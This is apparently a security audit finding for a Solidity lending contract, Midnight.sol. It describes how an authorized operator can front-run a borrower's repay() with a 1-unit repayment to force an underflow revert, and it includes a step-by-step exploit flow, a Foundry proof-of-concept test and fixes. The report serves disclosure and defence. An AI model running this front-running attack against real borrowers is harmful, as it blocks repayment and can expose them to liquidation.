### Title
Authorized Operator Front-Run Causes Arithmetic Underflow DoS on Borrower's `repay()` - (File: src/Midnight.sol)

### Summary
The `repay()` function in `src/Midnight.sol` allows any authorized operator to repay debt on behalf of a borrower. Because there is no check that `units <= position[id][onBehalf].debt` before the subtraction at line 508, an authorized operator can front-run a borrower's pending `repay()` transaction with a minimal repayment (as low as 1 unit), reducing the debt just enough to cause the borrower's original transaction to revert with an arithmetic underflow. This permanently prevents the borrower from executing their own repay transaction as long as the attacker keeps front-running.

### Finding Description
**Code path:**

`src/Midnight.sol`, `repay()`, lines 502–521:

```solidity
function repay(Market memory market, uint256 units, address onBehalf, address callback, bytes calldata data)
    external
{
    require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized()); // line 505
    bytes32 id = touchMarket(market);

    position[id][onBehalf].debt -= UtilsLib.toUint128(units); // line 508 — no upper-bound check
    ...
}
```

`UtilsLib.toUint128()` (`src/libraries/UtilsLib.sol`, lines 38–42) only guards against casting overflow (`x <= type(uint128).max`); it does **not** verify `units <= position[id][onBehalf].debt`. The subtraction at line 508 is in checked arithmetic (Solidity 0.8.34, no `unchecked` block), so it reverts on underflow.

**Exploit flow:**

1. **Precondition:** Borrower has `position[id][borrower].debt = D > 0` and has previously called `setIsAuthorized(attacker, true, borrower)`, making the attacker an authorized operator.
2. **Borrower broadcasts:** `repay(market, D, borrower, address(0), "")` — intending to clear their full debt.
3. **Attacker front-runs:** `repay(market, 1, borrower, address(0), "")` as the authorized operator, spending only 1 token. This sets `position[id][borrower].debt = D - 1`.
4. **Borrower's tx executes:** `position[id][borrower].debt -= D` → `(D-1) - D` → arithmetic underflow → **revert**.
5. **Repeat:** The attacker can repeat step 3 every time the borrower retries, at a cost of 1 token per block.

**Why existing checks fail:**
- Line 505 passes because `isAuthorized[borrower][attacker] == true`.
- There is no `require(units <= position[id][onBehalf].debt)` guard anywhere in `repay()`.
- `UtilsLib.toUint128` only checks for cast overflow, not for debt sufficiency.

### Impact Explanation
The borrower is permanently unable to execute their own `repay()` transaction as long as the attacker keeps front-running. This is a concrete DoS of the core `repay()` action. If the borrower needs to repay to avoid liquidation or to withdraw collateral, the attacker can block this indefinitely. The invariant "a borrower must always be able to repay their own debt" is broken.

### Likelihood Explanation
**Preconditions:**
- The attacker must be an authorized operator of the borrower. This is realistic: borrowers routinely authorize bundler/router contracts, and a malicious or compromised operator satisfies this condition.
- The borrower must have a pending `repay()` in the mempool (visible on public mempools).

**Feasibility:** High on any public mempool chain. The attacker spends 1 token per DoS attempt — negligible cost. The attack is repeatable every block indefinitely.

### Recommendation
Add an explicit upper-bound check before the subtraction, or use saturating subtraction capped at the current debt:

```solidity
// Option A: explicit guard
require(units <= position[id][onBehalf].debt, RepayExceedsDebt());
position[id][onBehalf].debt -= UtilsLib.toUint128(units);

// Option B: allow repaying up to current debt (no-op if already zero)
uint128 repaid = uint128(UtilsLib.min(units, position[id][onBehalf].debt));
position[id][onBehalf].debt -= repaid;
// adjust `units` used for withdrawable/transfer accordingly
```

Option A is the minimal fix and preserves exact-amount semantics. Option B additionally prevents the underflow even if the borrower over-specifies `units`.

### Proof of Concept

```solidity
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {IMidnight} from "../src/interfaces/IMidnight.sol";

contract RepayFrontRunDoSTest is BaseTest {
    function testRepayFrontRunDoS() public {
        uint256 units = 1000;

        // Setup: borrower takes a position (debt = units)
        collateralize(market, borrower, units);
        setupMarket(market, units);
        skip(99);

        // Borrower has debt = units
        assertEq(midnight.debtOf(id, borrower), units);

        // Borrower authorizes attacker as operator
        address attacker = makeAddr("attacker");
        vm.prank(borrower);
        midnight.setIsAuthorized(attacker, true, borrower);

        // Attacker front-runs with repay(1) — costs only 1 token
        deal(address(loanToken), attacker, 1);
        vm.prank(attacker);
        loanToken.approve(address(midnight), 1);
        vm.prank(attacker);
        midnight.repay(market, 1, borrower, address(0), hex"");

        // Borrower's debt is now units - 1
        assertEq(midnight.debtOf(id, borrower), units - 1);

        // Borrower tries to repay their original full debt — REVERTS with underflow
        deal(address(loanToken), borrower, units);
        vm.prank(borrower);
        loanToken.approve(address(midnight), units);
        vm.prank(borrower);
        vm.expectRevert(stdError.arithmeticError); // underflow: (units-1) - units
        midnight.repay(market, units, borrower, address(0), hex"");

        // Borrower's debt is still non-zero — DoS confirmed
        assertGt(midnight.debtOf(id, borrower), 0);
    }
}
```

- `vm.expectRevert(stdError.arithmeticError)` fires on the borrower's `repay(units)` call.
- `midnight.debtOf(id, borrower) > 0` after the failed repay confirms the borrower cannot clear their debt.
